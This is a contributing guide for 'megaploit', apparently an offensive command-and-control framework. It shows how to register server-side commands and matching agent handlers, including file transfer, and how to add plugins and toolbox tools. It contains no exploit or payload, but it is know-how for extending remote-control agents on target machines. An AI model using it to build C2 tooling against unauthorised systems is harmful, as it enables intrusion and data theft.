## Contributing

### Adding a Built-in Command

Register the handler on the **server** side in [`megaploit/server/commands.py`](megaploit/server/commands.py):

```python
@_cmd("mycommand", usage="mycommand <arg>", help_text="Does something useful")
def cmd_mycommand(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: mycommand <arg>")
    send_msg(session.conn, f"mycommand {args[0]}")
    return _ok(recv_msg(session.conn))
```

If the command receives a file, use `_recv_file_or_err` instead of calling `recv_file` directly:

```python
err = _recv_file_or_err(session.conn, local_path, timeout=30)
if err:
    return err
return _ok(f"[+] Saved to: {local_path}")
```

Register the corresponding handler on the **agent** side in [`megaploit/agent/handlers.py`](megaploit/agent/handlers.py):

```python
@_register("mycommand")
def _mycommand(conn, args: list[str]) -> str:
    return f"[+] Got: {args[0]}"
```

If the handler sends a file, emit `"FILE_OK"` first:

```python
@_register("mycommand")
def _mycommand(conn, args: list[str]) -> str | None:
    # ... produce the file ...
    _send_msg(conn, "FILE_OK")
    _send_file(conn, path)
    return None   # shell.py sends nothing when handler returns None
```

### Adding a Plugin (No Python Required)

Create `plugins/myplugin.toml` — see [`plugins/example.toml`](plugins/example.toml) for the full annotated reference.

### Adding a Toolbox Tool

```
megaploit > toolbox install https://github.com/user/repo toolname "description" --tags tag1,tag2
```

No code changes required.

### Code Style

- Python 3.10+ type hints throughout; `from __future__ import annotations` in every module
- `@dataclass` for all data structures
- ANSI colour output via the `_c()` helper in `cli.py` — no colour in library modules
- Every new C2 command must have both a server-side dispatcher and an agent-side handler
- Only add commands that do something a plain interactive shell cannot do
